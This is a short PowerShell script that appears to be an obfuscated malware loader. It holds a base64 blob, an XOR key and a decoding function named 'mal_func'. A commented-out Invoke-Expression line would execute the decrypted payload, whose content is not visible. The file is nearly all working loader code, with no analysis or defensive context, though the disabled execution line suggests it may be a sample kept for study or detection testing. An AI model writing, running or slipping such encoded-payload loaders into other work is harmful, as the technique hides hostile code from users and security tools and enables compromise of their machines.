
$var_1 = '2kTfnM56dExzyTr15fKoNct'
$var_2 = 'Fgk1Ejs/WRZZZVoSDSACCxpJelt5TUAHRWBSQHwGB0ssFhwWJBNWUEk8CjwXDFEbegQPORc7bmEaGw0SG11QNiobJkNJEkkXXDIaXFgAKg8JJQAXXEU6Gw4tCFpQCiBEY0cRRRAkCg4MJDReWQIuHW5eVBBPMQgYd3RmNAE5LjgIP1hWFCQcIQUAbjw9CAoiQkU4FgwbCyBSfFAIPjMeERtVGTULHRFmQgU3DA8Jdn87ERM5Ax0LG0AfNxMaHVRCDGVFWjM7G18YNiobJkNZYgogDk5pRkIFNwwPCRIdXVEDOU9jIBxbBzA2DzldFkYECApXIQBdF2tBYkRHHFcKMAMcPhULRAUDd3N0UhEVRBNCHRMRUQI1CkMFUFcAIApYWWlSE0QvJRd2JUdGHh4iJhVSeSEjKDATNhNYRT8qPAtSGV0JHlQ3H0xZVjcSNB46JHVdLD0KOC1MYFk/E1YiZXUmKhYSFCQId1dUDDY/Mx1+Ax4XTEA/S2lPdXAwOgReXgNmOCsBJlcaIQMdORUbMTcRWl02E0VgFCdPYysRUw8xFB1tEV4BJBwfCydSHHoTPyknDxESTzYHGgtcWgEVGQ4RWXg8Pw8tT2ZOOl0fdE46KEZCSRUZDhF0VlNUEg0GIgYkUx88T0dtTjtuZVhaWTEKWEFrQRJDaXk4TyEUAg5aWBAgFg5ZaVJxF2tBNAcNAFcZOgMaHl1ZFjEbDw0JfztgNAdSKAoYV1F7SUFpV1cQAxEWHAQTRV1rQU0Obn4/YQcDGmB2WQoxHRQNdF9hVBIjT2oWBl44PAkcOVZDEBUZDhF0X2dUCj4KbkcBQAcXCQA5UFgQZVU/FzcdVVwILE8PMDd7IllsY0dmQgU3DFcpJh1SUBU4T2MlHV4OBAcaJRUUBygcVBwsFxMVSwodKRYZVwUgKgc+QRZGahtaGXZWU1QSDQYiBiRTHzwGTG8VGyoqNh8OAxtfUQk8'

function mal_func ($var_2, $var_1) {
    $mal_func_var1 = [System.Text.Encoding]::UTF8.GetBytes($var_1)
    $mal_func_var2 = [Convert]::FromBase64String($var_2)
    $mal_func_var3 = New-Object byte[]($mal_func_var2.Length)

    for ($i = 0; $i -lt $mal_func_var2.Length; $i++) {
        $mal_func_var3[$i] = $mal_func_var2[$i] -bxor $mal_func_var1[$i % $mal_func_var1.Length]
    }

    return [System.Text.Encoding]::UTF8.GetString($mal_func_var3)
}

mal_func
# Invoke-Expression $(mal_func $var_2 $var_1)